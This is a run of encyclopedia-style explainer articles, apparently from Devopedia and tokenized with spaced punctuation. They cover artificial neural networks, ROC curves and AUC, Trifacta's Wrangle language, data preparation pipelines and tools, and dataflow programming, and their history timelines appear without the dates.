The higher the weight , the greater the influence of that input on the outcome .
Bias value allows you to shift the activation function curve up or down .
Loss Function - A way to evaluate the " goodness " of predictions .
It quantifies the gap between predicted and actual values .
Sum Of Squares Error is an example loss function .
What are the most common types of Artificial Neural Networks used in ML ?
We note the following types of ANNs : Feed Forward Networks - the simplest form of ANN where data travels in one direction through a network of perceptrons , from the input layer towards the output layer .
Errors in prediction are fed back to update weights and biases using backpropagation .
Over multiple iterations , weights and bias values are tuned so that the predicted values converge on the actuals .
Activation functions commonly used are sigmoid , tanh or RELU .
Recurrent Neural Networks - Works on the principle of saving the output of a layer and feeding this back to the input to help in predicting the outcome of the layer .
From one time - step to the next , each neuron remembers some information it had in the previous time - step .
This makes each neuron act like a memory cell in performing computations ( LSTM ) .
Radial Basis Function - Functions that have a distance criterion with respect to a center .
It has an input layer , a radial basis hidden layer and an output layer .
The Commonly used activation functions are Gaussian and multi - quadratic .
Applied in Power Restoration Systems when restoration happens from core priority areas to the periphery .
How does an ANN learn ?
The ANN learns through an iterative training routine where weights and biases are continually adjusted to improve the strength of the prediction .
Steps are : Identify input values , assign random initial values as weights to these inputs .
For supervised learning , segregate training and test data sets .
Finalise the hidden layers and nodes in them .
Identify the number of epochs and batch sizes .
Training data set is generally sliced into batches .
An epoch is one complete pass through the whole training set .
Training typically requires several epochs .
Pass the training set through the layers .
Determine predicted outcome at the end of the iteration .
Study the extent of miscalculation , now adjust the weights ( W = W + ΔW ) through backpropagation .
The amount of change in w per iteration is called Learning Rate .
Large values of learning rate would train the network faster , but may result in overshooting the optimal solution .
We need a balance , determined by the gradient descent method of optimising the loss / cost function .
After several iterations , the network achieves acceptable reliability in the predicted outcome .
Verify by applying the test data set , check for model accuracy .
Now the ANN is set to have ‘ learned ’ and is ready for deployment .
What are the key differentiators between traditional ML techniques and ANN ?
ANN and traditional ML techniques like logistic regression are algorithms meant to do the same thing - classification of data .
However , while logistic regression is a statistical method , ANN is a heuristic method modelled on the human brain .
In many cases , simple neural network configurations yield the same solution as many traditional statistical applications .
For example , a single - layer , feed forward neural network with linear activation for its output perceptron is equivalent to a general linear regression fit .
When you use the sigmoid activation function in ANN , it behaves like logistic regression .
However , one of the unique aspects of an ANN is the presence of its hidden layers .
Since movement of data between these layers is automatic , these steps can not be statistically expressed .
Hence , debugging or tracing data values through these intermediate steps is n't possible .
Whereas in regular ML algorithms , the input to output transition can be traced entirely .
The ability of data to reiterate through hidden layers allows hierarchical processing .
This is the reason ANN forms the basis of Deep Learning , while other ML techniques are unsuitable .
When to use and not to use Artificial Neural Networks ?
When data is well structured , free of inconsistencies and somewhat linear in nature , traditional ML models such as linear regression , classification or PCA work remarkably well .
But in applications such as text validation or speech recognition , data tends to be non - linear and incomplete .
It is also subject to human error and variations of language , dialect or handwriting .
In such applications , ANN works with good accuracy .
For large and complex data where a small amount of time series data is available or where large amounts of noise exist , standard ML approaches can become difficult , even impossible .
They may require weeks of a statistician ’s time to build , as the data clean up and pre - processing effort is huge .
Neural networks accommodate circumstances where the existing data has useful information to offer , but it might be clouded by factors mentioned above .
Neural networks can also account for mixtures of continuous and categorical data .
To build a predictive model for a complex system , ANN does not require a statistician and domain expert to screen through every possible combination of variables .
Thus , the neural network approach can dramatically reduce the time required to build a model .
Neurophysiologist Warren McCulloch and mathematician Walter Pitts wrote a paper on how neurons might work .
In order to describe how neurons in the brain might work , they model a simple neural network using electrical circuits .
Donald Hebb , in his book The Organization of Behaviour , proposes a model of learning based on neural plasticity .
Later , called Hebbian Learning , it 's often summarized by the phrase " cells that fire together , wire together " .
Frank Rosenblatt , a psychologist at Cornell , proposes the idea of a Perceptron , modeled on the McCulloch - Pitts neuron .
Widrow and Hoff developed a learning procedure that examines weight values and determines the output of perceptrons accordingly .
The first multilayered network has been developed .
It 's an unsupervised network .
A key trigger for renewed interest in neural networks and learning is Werbos 's backpropagation algorithm that made the training of multi - layer networks feasible and efficient .
American Institute of Physics , establishes a Neural Networks in Computing annual meeting .
The first International Conference on Neural Networks was organized by the Institute of Electrical and Electronics Engineers ( IEEE ) .
Recurrent neural networks and deep feedforward neural networks developed by Schmidhuber 's research group won eight international competitions in pattern recognition and machine learning .
Backpropagation training through max - pooling is accelerated by GPUs and shown to perform better than other pooling variants .
Ng and Dean created a network that learns to recognize higher level concepts such as cats , only from watching unlabeled images taken from YouTube videos .
In many applications , there 's a need to decide between two alternatives .
In the military , radar operators look at approaching objects and decide if they are a threat .
Doctors look at an image and decide if it 's a tumour .
For facial recognition , an algorithm has to decide if it 's a match .
In Machine Learning , we call this binary classification , while in radar we call it signal detection .
The decision depends on a threshold .
The Receiver Operating Characteristic ( ROC ) Curve is a graphical plot that helps us see the performance of a binary classifier or diagnostic test when the threshold is varied .
Using the ROC Curve , we can select a threshold that best suits our application .
The idea is to maximize correct classification or detection while minimizing false positives .
The ROC Curve is also useful when comparing alternative classifiers or diagnostic tests .
How do we define or plot the ROC Curve ?
ROC Curve plotted when threshold & beta are varied .
Source : Wikimedia Commons 2015 .
Let 's take a binary classification problem that has two distributions : one for positives and one for negatives .
To classify subjects into one of these two classes , we select a threshold .
Anything above the threshold is classified as positive .
The accuracy of the classifier depends directly on the threshold we use .
The ROC Curve is plotted by varying the thresholds and recording the classifier 's performance at each threshold .
ROC curve plots True Positive Rate ( TPR ) versus False Positive Rate ( FPR ) .
TPR is also called recall or sensitivity .
TPR is the probability that we detect a signal when it 's present .
FPR is the complement of specificity : ( 1-specificity ) .
FPR is the probability that we detect a signal when it 's not present .
Being based on only recall and specificity , the ROC curve is independent of prevalence , that is , how common the condition is in the population .
An ideal classifier will have an ROC curve that rises sharply from origin until FPR rises when TPR is already high .
Each point on the ROC curve represents the performance of the classifier at one threshold value .
Which application domains using ROC Curves ?
ROC started in radar applications .
It was later applied in many other domains , including psychology , medicine , radiology , biometrics , and meteorology .
More recently , it 's being used in machine learning and data mining .
In medical practice , it 's used for assessing diagnostic biomarkers , imaging tests or even risk assessment .
It 's been used to analyse information processing in the brain during sensory difference testing .
In bioinformatics and computational genomics , ROC analysis is being applied .
In particular , it 's used to classify biological sequences and protein structures .
ROC has been used to describe the performance of instruments built to detect explosives .
In engineering , it 's been used to evaluate the accuracy of pipeline reliability analysis and predict the failure threshold value .
What is the AUC and its significance ?
A high AUC will leave a small top - left corner outside the area .
Source : Narkhede 2018 .
After plotting the ROC Curve , the area under it is called Area Under the ROC Curve ( AUC ) , Area Under the Curve ( AUC ) , or AUROC .
It 's been said that " ROC is a probability curve and AUC represents the degree or measure of separability " .
In other words , AUC is a single metric that can be used to quantify how well two classes are separated by a binary classifier .
It 's also useful when comparing different classifiers .
AUC has some useful properties .
It 's scale - invariant .
This means it tells how well predictions are ranked rather than their absolute values .
AUC is also classification - threshold - invariant .
We can objectively compare prediction models irrespective of classification thresholds used .
However , these properties are not desirable for some applications .
AUC is also prevalence - invariant .
Suppose a health condition is prevalent in only 1 % of the population .
A simple classifier can achieve 99 % accuracy by predicting negative always .
AUC , however , gives a more useful value of 0.5 .
How do I interpret an AUC value ?
Since both axes of the ROC Curve range [ 0,1 ] , AUC also ranges [ 0,1 ] .
Some researchers map AUC to Gini Coefficient , which is 2*AUC-1 , with a range [ -1,-1 ] .
More realistically , AUC has a range of [ 0.5,1 ] since the ROC curve is expected to be above the diagonal .
Value 0.5 implies very poor separation and is represented by the diagonal ROC curve .
Value 1 implies perfect separation , where TPR is always 1 at all values of FPR .
As a thumb rule , we have an excellent classifier if the AUC is > = 0.9 and a good classifier when it 's > = 0.8 .
Why do I need an ROC Curve when TPR and FPR may be adequate ?
Illustrating how an ROC Curve aids analysis .
Source : Adapted from Joy et al .
2005 , fig .
C-2 , C-3 , C-4 .
ROC Curve is a useful tool to compare classification methods and decide which one is better .
Suppose a computer algorithm is implemented to diagnose a medical condition .
Using ROC curves , we can compare its performance against a doctor 's diagnosis , and against doctor 's diagnosis when aided with computer - assisted detection ( CAD ) .
As shown in the figure , a doctor using CAD gives the best performance .
The other two approaches have the same AUC but the doctor has a higher specificity ( lower FPR ) .
In any binary classification problem , it 's not possible to agree on a single threshold and consequently on values of sensitivity and specificity .
Take the case of diagnostic testing as an example .
The thresholds would be adjusted based on the context and available information , such as patient history , presence of symptoms , or even the likelihood of getting sued for a missed cancer .
If we just plot two points for two classifiers , it 's hard to know which one is better .
Once we plot entire ROC curves , it 's easy to see which one is better .
For a binary classification problem , how to I select the optimum threshold on the ROC Curve ?
Measures for selecting threshold from an ROC curve .
Source : Kumar and Indrayan 2011 , fig .
1 .
There are basically two methods of determining the optimum threshold : Minimum - d : This is the shortest distance of the curve from the top - left corner or ( 0,1 ) point .
Youden index : This is the vertical distance from the curve to the diagonal .
To find the optimum point on the curve , we should maximize the Youden index .
ROC Curve and AUC ignore prevalence or misclassification costs .
For example , poor sensitivity means missed cancer and delayed treatment , whereas poor specificity means unnecessary treatment .
Likewise , a false positive on a blood test for HIV simply means a discarded blood sample , but a false negative will infect the blood recipient .
It 's for this reason , decision makers should consider financial costs , and combine ROC analysis with utility - based decision theory to find the optimum threshold .
How do I apply ROC Curves to multiclass problems ?
Precision vs. Recall curves are suited for multiclass problems .
Source : Döring 2018 .
Given \(c\ ) classes , the ROC space has \(c(c-1)\ ) dimensions .
This makes it difficult to apply ROC Curve methodology to multiclass problems .
However , some attempt has been made to apply it to 3 classes where the AUC concept is extended to Volume Under the ROC Surface ( VUS ) .
One approach is to reframe the problem into \(c\ ) one - vs - all binary classifiers .
However , the ROC Curve may not be suitable since FPR will be underestimated due to the large number of negative data points .
For this reason , Precision vs. Recall curve is more suitable .
For computing the AUC , one technique is to average pairwise comparisons .
This equivalent AUC value is useful since we can ignore the costs associated with different kinds of misclassification errors .
What are some pitfalls or drawbacks of using ROC Curve and AUC ?
In practice , AUC must be presented with a confidence interval , such as 95 % CI , since it 's estimated from a population sample .
However , research in clinical chemistry shows that many researchers failed to include CI or constructed them incorrectly .
AUC involves loss of information .
Two ROC curves crossing each other can have the same AUC but each will have a range of thresholds at which it 's better .
Clinicians and patients interpret sensitivity and specificity but do n't find AUC useful .
They 're not interested in performance across all thresholds .
In ML , cost curves have been proposed as an alternative .
Another alternative is the H - measure .
AUC ignores the misclassification of costs .
A new test may be deemed worthless by using AUC alone .
AUC also ignores prevalence , but it 's known that prevalence affects test results .
While sensitivity and specificity are also independent of prevalence , prevalence can be considered during interpretation of the ROC curve .
Jorge M. Lobo et al .
give many other reasons why AUC is not a suitable measure .
What software packages are available for ROC analysis ?
In R language , we can use the pROC package .
Once we obtain the actual and predicted values , we can obtain the AUC along with confidence interval using the function ` ci.auc ( ) ` .
On GitHub , ` sachsmc / plotROC ` is an open source package for easily plotting ROC curves .
It uses ggplot2 , to which it adds handy functions for plotting : ` geom_roc ` , ` geom_rocci ` and ` style_roc ` .
In Python , a webpage on Scikit - learn gives code examples showing how to plot ROC curves and compute AUC for both binary and multiclass problems .
It makes use of functions ` roc_curve ` and ` auc ` that are part of sklearn.metrics package .
The idea of the ROC started in the 1940s with the use of radar during World War II .
The task is to identify enemy aircraft while avoiding false detection of benign objects .
The ROC provides a suitable threshold for radar receiver operators .
This also explains the origin of the term Receiver Operating Characteristic ( ROC ) .
In the 1950s , psychologists started using ROC when studying the relationship between psychological experience and physical stimuli .
The ROC curve shows that its slope equals the threshold .
Source : Peterson and Birdsall 1953 , fig .
1.3 .
Peterson and Birdsall explain the ROC Curve in detail in the context of signal detection theory .
They plot the probability of signal detection versus probability of false alarm .
Curve-1 represents optimum operation , curve-3 sets the lower limit , and curve-2 is by guessing .
Curve-1 is produced by varying the operating level or threshold & beta ; , which is also the slope of the curve at that point .
The value of the y - intercept is the one that needs to be maximized .
L.B. Lusted applies ROC methodology to compare different studies of chest film interpretations for detection of pulmonary tuberculosis .
This is the first application of ROC to radiology .
It subsequently inspires the use of ROC in many diagnostic imaging systems .
Lusted himself published Decision - making studies in patient management in 1971 .
Dorfman and Alf developed a method of curve fitting and used software to automate ROC analysis .
A maximum likelihood approach under binomial assumption is developed .
Many other programs written in FORTRAN are developed later : ROCFIT , CORROC , ROCPWR , and LABROC .
The concept of Free - Response Receiver Operating Characteristic ( FROC ) Curve is introduced in the auditory domain .
In free - response analysis , in addition to detection , we also need to point out the location .
The term " free - response " was coined in 1961 .
In 1978 , FROC was applied for the first time in imaging .
FROC can help where ROC can fail .
For example , ROC can show location - level false positive and false negative that could " cancel " each other .
This gives an image - level true positive : the image shows cancer but the wrong location is reported .
Although Area Under the ROC Curve ( AUC ) was previously used , Hanley and McNeil developed analytical techniques to bring out its statistical properties .
They estimate the standard error for different underlying distributions and sample sizes .
As one of the earliest applications of ROC Curve to machine learning , K.A. Spackman uses it to evaluate and compare ML algorithms .
Andrew Bradley notes that the ROC curve is useful for visualizing a classifier 's performance but not suitable for comparing multiple classification methods .
A single performance measure is more desirable .
He discusses how AUC can be used as a measure for comparing machine learning algorithms .
He explains why AUC is a better measure than overall accuracy .
ROC Curves , AUC values and threshold selection .
Source : Swets et al .
2000 .
An article titled Better decisions through science appears in Scientific American .
It brings ROC Curve to the attention of a wider audience .
One example in this article talks about glaucoma diagnosis using eye fluid pressure .
It defines the basic terms and shows hypothetical distribution curves , ROC Curves , and AUC .
It states that AUC is a reflection of a test 's accuracy .
Hand and Till generalize the concept of AUC for multiclass problems .
In 2007 , Landgrebe and Duin approximated the problem via pairwise analysis .
Real - world data is messy .
Before we can do any useful analysis of data , we need to clean or format it in a manner that 's acceptable to data analysis or visualization tools .
This process is often called data wrangling .
We can do this interactively , but it 's better to record all actions into a script or write a custom program .
This will help us document how the data was wrangled and also repeat the process with new data .
Wrangle is a proprietary language for automating the task of data wrangling .
It 's owned and managed by Trifacta .
Once wrangled , data can be exported in CSV or JSON formats , which are supported by most analysis or visualization tools .
The essence of Wrangle is this : Spend less time fighting with your data and more time learning from it .
In Wrangle , what are transforms , functions and recipes ?
Here are the three essential aspects of Wrangle : Transform : This is an action that modifies the dataset in a specific way .
Typically , a dataset is in table format with rows and columns .
Transforms accept parameters to set the context in terms of rows , columns or conditions .
Examples include deduplicate , delete , derive , drop , extract , filter , flatten , nest , pivot , replace , etc .
Function : Like in any programming language , a Wrangler function is a computation unit .
It works on one of more columns of data .
Functions can be passed as parameters to transforms .
There are lots of functions that are usually organized into function categories such as aggregate ( COUNT , MAX ) , logical ( AND , OR ) , comparison ( ISODD , LESSTHAN ) , math ( DIVIDE , SQRT ) , date ( DATEADD , NOW ) , string ( LOWER , FIND ) , nested ( ARRAYCONCAT , LISTSUM ) , type ( IFNULL , ISMISSING ) , window ( FILL , ROLLINGSUM ) , and others ( RAND , RANGE ) .
Recipe : This is a sequence of transforms applied to a dataset .
It 's common to name transform in lowercase and functions in uppercase .
Transforms and functions are the building blocks from which powerful recipes can be built .
Could you describe the Wrangle syntax with some examples ?
Illustrating the use of split transform .
Source : Adapted from Trifacta Docs 2019i .
Wrangle transforms follow the general syntax of the transform 's name followed by optional parameters : ` ( transform ) param1:(expression ) param2:(expression ) ` .
Let 's look at a few examples to understand this .
To create a new column called " circumference " based on another column of values named " diameter " , we can apply the ` derive ` transform : ` derive type : single value : ( 3.14159 * diameter ) as : ' circumference ' ` To create a column of Boolean values indicating big orders , we can use the ` derive ` transform : ` derive type : single value : IF(order > 1000000 , true , false ) as:'bigOrder ' ` By passing a regular expression parameter to the ` replace ` transform , we can delete last two digits from " qty " column : ` replace col : qty on : /^\d$|^\d\d$/ with : '' global : true ` Suppose a column named " myCol " is in the format of key - value pairs , such as ` { " brand":"Subaru","model":"Impreza","color","green " } ` .
We can separate this into three columns using the ` unnest ` transform : ` unnest col : myCol keys:'brand','model','color ' ` We can use the ` filter ` transform to keep only rows that match a specific condition : ` filter row : ( row_number > = 25 & & firstName = = ' Steve ' ) action : Keep ` Which data types are supported in Wrangle ?
Basic data types include ` String ` , ` Integer ` , ` Decimal ` , and ` Boolean ` .
String size is limited by the size of a row of data , which is about 1 MB .
Integers can be safely used within the range ( -2 ^ 53 + 1 ) to ( 2 ^ 53 - 1 ) .
Decimals are limited to 15 floating point digits .
It 's not clear if these are limits of the Wrangle language or the Trifacta Wrangler family of products .
Other data types include Social Security Number , Phone Number , Email Address , Credit Card , Gender Data , Zip Code , State , IP Address , URL , HTTP Code and Datetime .
However , some of these wo n't be useful for non - U.S. data .
The ` Array ` type can be used to group together a sequence of values .
Arrays can be nested ; that is , an array containing another array .
Arrays can be ragged ; that is , the number of items in an array can vary from one data record to the next .
To store key - value pairs , we can use the ` Object ` type .
This can also be nested like in arrays but there 's no ordering of items within the type .
What are some concerns about the Wrangle language ?
The transformer page of Wrangle tool interactively suggests possible data transforms .
Source : Trifacta Docs 2019 g .
Wrangle language is not an open standard .
It 's owned and managed by Trifacta .
It 's supported by Trifacta 's Wrangler family of products .
It 's also available within partner products such as Google 's Cloud Dataprep .
While learning the language is useful , it 's not essential , since these products often generate the language syntax for the user via contextual suggestions and steps .
Because it 's not open , there 's a vendor lock - in .
This means that any data preparation workflows that you build with Wrangle ca n't be reused when you move to another platform .
For example , AWS has its own tool for data preparation called Glue .
ETL workflows can be programmed in Glue using Python , PySpark extensions and Scala .
However , anything written in Wrangle ca n't be reused in AWS .
Only the wrangled data can be exported and imported into other tools or platforms .
Transforms show how to clear name format differences .
Source : Raman and Hellerstein 2001 , fig .
6 .
Researchers from UC Berkeley published a paper titled Potter ’s Wheel : An Interactive Data Cleaning System .
They identify a number of transforms that can help with data wrangling .
A declarative script written in JavaScript .
Source : Kandel et al .
2011 , fig .
7 .
Led by researchers at the Stanford Visualization Group , a paper titled Wrangler : Interactive Visual Specification of Data Transformation Scripts is published .
While the tool is visual and interactive in nature , the paper also talks about a declarative transformation language that has evolved along with the tool .
Among the transforms supported are delete , extract , cut , split , lookups , joins , fold , unfold , fill , lag ; plus sorting and aggregating functions such as sum , min , max and mean .
Stanford 's Wrangler is commercialized with the release of Data Transformation Platform .
An alpha version of this was available back in April 2013 and the company behind it , Trifacta , was founded in 2012 .
Trifacta releases Wrangler , a free desktop application for data wrangling .
It has limited features compared to the commercial offering that 's renamed Trifacta Wrangler Enterprise .
Google launches Cloud Dataprep for data preparation in the cloud .
Under the hood , it makes use of Trifacta Wrangler Enterprise along with the Wrangle language .
Trifacta Wrangler is released as a cloud product .
The desktop version will no longer be updated and cease operation ( implying data loss ) in August 2019 .
New functions are introduced , including ARRAYINDEXOF , ARRAYRIGHTINDEXOF , ARRAYSLICE and ARRAYMERGEELEMENTS .
Functions RANK and DENSERANK are introduced .
Data preparation enables data analytics .
Source : Devopedia 2020 .
Raw data is usually not suitable for direct analysis .
This is because the data might come from different sources in different formats .
Moreover , real - world data is not clean .
Some data points might be missing .
Some others might be out of range .
There could be duplicates .
Data preparation is , therefore , an essential task that transforms or prepares data into a form that 's suitable for analysis .
Data preparation assumes that data has already been collected .
However , others may consider data collection and data ingestion as part of data preparation .
Within data preparation , it 's common to identify sub - stages that might include data pre - processing , data wrangling , and data transformation .
Useful insights from data via analytics is the final goal in today 's data - driven world .
However , data preparation is an important task .
Poorly prepared data can make analytics more difficult and ineffective .
What 's the typical pipeline for data preparation ?
Typical pipeline for data preparation .
Source : Pearlman 2018 .
The first step of a data preparation pipeline is to gather data from various sources and locations .
Before any processing is done , we wish to discover what the data is about .
At this stage , we understand the data within the context of business goals .
Visualization of the data is also helpful here .
The next stage is to cleanse the data of missing values and invalid values .
We also reformat data to standard forms .
Next , we transform the data for a specific outcome or audience .
We can enrich data by merging different datasets to enable richer insights .
Finally , we store the data or directly send it out for analytics .
In the context of machine learning , data pre - processing converts raw data into clean data .
This involves iteratively cleaning , integration , transformation and reduction of data .
When an ML model is being prototyped , often data scientists may wish to go back to convert the data into a more useful form .
This could be called data wrangling or data munging .
This involves filtering , grouping , sorting , aggregating or decomposing data as required for modelling .
What are some common tasks involved in data preparation ?
Some data preparation tasks to solve specific problems .
Source : Gill 2018 .
Data preparation involves one or more of the following tasks : Aggregation : Multiple columns are reduced to fewer columns .
Records are summarized .
Anonymization : Sensitive values are removed for the sake of privacy .
Augmentation : Expand the dataset size without collecting more data .
For example , image data is augmented via cropping or rotating .
Blending : Combine and link related data from various sources .
For example , combine an employee 's HR data with payroll data .
Decomposing : Decompose a data column that has sub - fields .
For example , " 6 ounces butter " is decomposed into three columns representing value , unit and ingredient .
Deletion : Duplicates and outliers are removed .
Exploratory Data Analysis ( EDA ) may be used to identify outliers .
Formatting : Data is modified to a consistent form .
For example , 2019-Jul-01 , 2019 - 07 - 1 , and 1/7/19 are changed to a single form , such as 2019 - 07 - 01 .
Imputation : Fill in missing values using estimates from available data .
Labelling : Data is labelled for supervised machine learning .
Normalization : Data is scaled or shifted , perhaps to a range of 0 - 1 .
Sampling : For a quick analysis , select a small representative sample .
What attributes are important in the context of data preparation ?
Results of a survey of 384 respondents about data preparation attributes .
Source : Stodder 2016 , fig .
3 .
It 's important to measure the data preparation pipeline and assess how well it delivers data for analytics .
To start with , data quality is measured by its accuracy , completeness , consistency , timeliness , believability , added value , interpretability , and accessibility .
The pipeline must be able to validate data , spot problems and give tools to understand why they 're occurring .
With the growing demand for near real - time analytics , we expect frequent data refreshing .
Ideally , data quality is maintained even when the refresh rate is high .
In practice , there may be a trade - off .
Data must be easy to access even with growing data variety and volume .
Data lakes and Hadoop are enablers in this regard .
Data must also conform to data models , domain models and database schemas .
Data preparation must be checked for conformance .
Data preparation must ensure consistency across various datasets .
For example , variations due to spelling or abbreviations must be handled .
One sports dataset may use the term ' soccer ' while another may use the term ' football ' .
Unlike ETL systems , data preparation pipeline must be more flexible for ad hoc processing .
What are some challenges involved in preparing data ?
Results of a survey of 311 respondents about data preparation challenges .
Source : Stodder 2016 , fig .
4 .
A common challenge faced by businesses is the diversity of data sources , siloed or proprietary tools , tedious processes , and regulatory compliance .
Incompatible data formats , messy data and unbalanced data are further challenges .
When manual processes are used , businesses spend more time preparing data than analyzing it .
Therefore , organizations must invest in tools and automation .
Indeed , data scientists should get involved with teams tasked with data preparation .
It 's been said that " bad data is bad for business " .
Organizations are unsure of data 's quality and hence lack confidence in using it for decision making .
This can be solved by investing early in data collection and preparation .
Profile the data landscape .
Improve data quality at source .
Some applications ( such as fraud detection or industrial IoT apps ) may require data preparation in real time .
With large data volumes , collecting , preparing and storing data at scale is a challenge .
In production , the preparation pipeline should be repeatable , handle errors and tuned for performance .
It should work for initial data , incremental data and streamed data .
Could you share some best practices for data preparation ?
Check data types and formats .
Check if the data is accurate .
Graph the data to get a sense of the distribution and outliers .
If these are not as expected , question your assumptions .
Label and annotate the graphs .
Backup the data .
Document or record the steps so that they can be repeated when new data comes in .
Data professionals should n't rely too much on IT departments .
Adopt data systems and tools that are user-friendly .
Data literacy , which is the ability to read , analyze and argue from data , is an essential skill today .
Engineers , data scientists and business users must talk in a common language .
Prepare data with a good understanding of the context and the business goals .
Profile the data first .
Start with a small sample .
Iteratively , try different cleaning strategies and discuss the results with business stakeholders .
Keep in mind that data may change in the future .
Data preparation is therefore not a do - once - and - forget task .
Which programming languages are well suited for data preparation tasks ?
Querying , filtering , and sampling in R and Pandas .
Source : Pandas Docs 2020 .
Two well - known libraries for data preparation are ` pandas ` ( Python ) and ` dplyr ` ( R ) .
Apache Spark , more a framework than a language , is also suited for data preparation .
Apache Spark enables fast in - memory data processing in a distributed architecture .
The main data structure in ` pandas ` is the DataFrame .
The method ` df.describe ( ) ` is a quick way to describe the data .
A more detailed profile can be obtained using the ` pandas - profiling ` package .
Missing values are represented as ` NaN ` or " not a number " .
Methods ` df.fillna ( ) ` and ` df.dropna ( ) ` help in dealing with NaN values .
A couple of useful tutorials using Pandas are by Jaiswal and by Osei .
In R , the equivalent data structure is ` data.frame ` .
A brief structure of the data can be seen using ` str ( ) ` .
Missing data is marked as ` NA ` .
Packages ` dplyr ` and ` tidyr ` can be used for data preparation .
Spark provides APIs in Python , R , Java , Scala and SQL .
When Spark is used , it 's possible to convert between Spark DataFrames and Pandas DataFrames using Apache Arrow .
Could you list some tools that aid data preparation with minimal coding ?
Market map of self - service data preparation tools .
Source : Howard 2019 .
Data analysis ca n't happen without data preparation .
To enable this with minimal or no coding , it 's best to use a self - service data preparation tool .
This helps data analysts , business owners and data scientists .
There are many of these in the market today ( 2019 ) : Altair Monarch , Alteryx , ClearStory , Datameer , DataWatch , Dialogue , Improvado , LavaStorm , Microstrategy , Oracle , Paxata , Qlik , Quest , SAP , SAS , Tableau Prep , TIBCO , Trifacta , and Zaloni .
Many tools can combine data from different sources .
They include visualization and exploratory data analysis .
For data preparation , they can clean , augment , transform , or anonymize data .
Some self - service tools include analytics and cataloguing .
Good tools manage metadata and offer a search feature .
They can track data sources and data transformations .
While developing data preparation pipelines , tools should support real - time visualizations .
This facilitates quick debugging of the processing logic .
However , it 's been noted that many tools are unable to handle big data or fast enough for complex queries .
When choosing a suitable tool , some aspects to consider are features , pricing , performance , usability , collaboration , licensing model , vendor viability , customer support , enterprise integration , security and ecosystem .
This decade sees the growing use of data in organizations .
However , data is controlled and managed by IT departments .
Data scientists work with IT staff .
Data preparation involves coding and specialized expertise .
Meanwhile , Business Intelligence ( BI ) tools show the benefits of data visualization and reporting .
Users shift from spreadsheets to BI tools .
This leads to more and more requests for data access and analysis .
IT is soon overwhelmed by the workload .
In a report titled Competing on Analytics , researchers note that companies are competing based on data and analytics .
Statistical analysis and predictive modelling have become important .
However , the report makes no mention of data preparation .
To cope with the shift towards data - centric operations , IT opens up data to other departments .
While this brings speed , data also gets siloed and inconsistent across datasets .
Spreadsheets are error prone .
ETL tools are rigid and therefore not suited for rapid prototyping .
In this context , self - service data preparation tools emerge .
These require almost no coding and enable rapid iterations .
A screenshot of Google Cloud Dataprep by Trifacta .
Source : Cariou 2019 .
Google Cloud Platform announces the general availability of Google Cloud Dataprep , a cloud offering from Trifacta .
This is a self - managed data preparation tool that integrates well with other parts of Google Cloud , such as BigQuery and Cloud Dataflow .
Prepared data can then be analyzed in Google Data Studio .
A study by the International Data Corporation ( IDC ) finds that 33 % of time is spent on data preparation , 32 % on analytics and only 13 % on data science .
Respondents note that " too much time is spent on data preparation " .
They also recognize that they need to automate data preparation to acceleration their analytics pipeline .
Illustrating the use of InSPECT 's Dataflow for IoT. Source : The Concord Consortium 2018 .
Dataflow programming ( DFP ) is a programming paradigm where program execution is conceptualized as data flowing through a series of operations or transformations .
Each operation may be represented as a node in a graph .
Nodes are connected by directed arcs through which data flows .
A node performs its operation when its input data is available .
It sends out the result on the output arcs .
Due to social media ( 2000s ) and IoT ( 2010s ) , there 's a need to analyse data quickly and derive timely insights .
There 's also a need to explore and exploit parallel architectures .
Dataflow programming aids parallelization without the added complexity that comes with traditional programming .
Dataflow programming includes two sub - fields : Flow - Based Programming ( FBP ) and Reactive Programming .
Dataflow programs can be created in text or visually .
There are many languages that support this paradigm .
Could you explain dataflow programming with an example ?
A simple program and its dataflow equivalent .
Source : Johnston et al .
2004 , fig .
1 .
Consider the simple program shown in the figure .
In traditional von Neumann architecture , these statements would be executed sequentially .
Thus , the program would be executed in three units of time .
In dataflow programming , we represent the program as a dataflow graph that has three inputs ( X , Y , 10 ) , three operations ( + , / , * ) and one output ( C ) .
This is a directed graph .
Nodes represent instructions or operations .
Arcs represent variables .
Equivalently , arcs represent data dependencies between instructions .
The value in Y is also duplicated since it 's sent to two instructions .
In the dataflow execution model , this program takes only two units of time .
This is because the addition and division instructions can be executed in parallel .
For each of these instructions , their respective inputs are available at the start .
They have no dependencies on each other and therefore can be parallelized .
A factory assembly line offers an analogy .
Just as raw materials and semi - finished products move on a conveyor belt from one station to the next , data in DFP moves from one node to the next .
What are the main benefits of dataflow programming ?
MPEG-4 stream decoder written in CAL actor language .
Source : Savas et al .
2018 , fig .
2 .
With the rise of multi - core architectures , there 's a need to exploit these via parallel execution .
Von Neumann architecture is not conducive to parallelism because of its reliance on a global program counter and global updatable memory .
With DFP , each node uses local memory and executes when its inputs are ready .
DFP enables parallel execution without extra burden on the programmer .
There 's no need to deal with multiple threads , semaphores and deadlocks .
Each node in the dataflow graph is independent of others and executes without side effects .
A node executes as soon as its inputs are available .
If multiple nodes are ready to execute , they can execute in parallel .
DFP has enabled many visual programming languages that provide a more user - friendly interface so that even non - technical users can write programs .
Such languages are also suited for rapid prototyping .
DFP promotes loose coupling between software components that 's well - suited for service - oriented architectures .
Its functional style makes it easier to reason about system behaviour .
Its simplicity is in its elegance .
DFP is deterministic .
This enables mathematical analysis and proofs .
What are the main characteristics of dataflow programming ?
Basics of dataflow programming .
Source : Carkci 2013 .
A program is defined by its nodes , I / O ports and links .
A node can have multiple inputs and outputs .
Links connect nodes .
Links can be viewed as buffers if they need to hold multiple data packets .
This is useful when sending and receiving nodes operate at different speeds .
Buffers also enable pipelining whereby nodes can execute simultaneously .
A data packet can take primitive / compound , structured / unstructured values , and even include other data packets .
When multiple links join , packets are merged or concatenated .
For link splitting , packets are duplicated ( shallow or deep copy ) .
Equivalently , nodes can join and split .
Execution can be either a push or pull model .
Push does eager evaluation and reacts to change .
Pull does lazy evaluation and uses callbacks .
Nodes in push model fire when inputs are available , whereas nodes in pull model fire when output is requested .
Execution can be synchronous or asynchronous .
With synchronous execution , each node takes one " unit of time " .
Fast nodes will wait for slow nodes to complete before outputting the results .
With asynchronous execution , output is never delayed and systems can run at full speed .
What are some traits expected of dataflow languages ?
Dataflow languages are expected to be free from side effects .
There 's locality of effect .
Scheduling is determined from data dependencies .
Variables may be seen as values since they 're assigned once and never modified .
The order of statements is not important .
An example of a side effect is a function modifying variables in the outer scope .
Locality of effect means that instructions can have far - reaching data dependencies .
This is easily possible in imperative languages by reusing the same variables or using ` goto ` statements .
Neither of these should be allowed by dataflow languages .
The language should be designed such that it 's easy to identify data dependencies and generate graphs that expose parallelism .
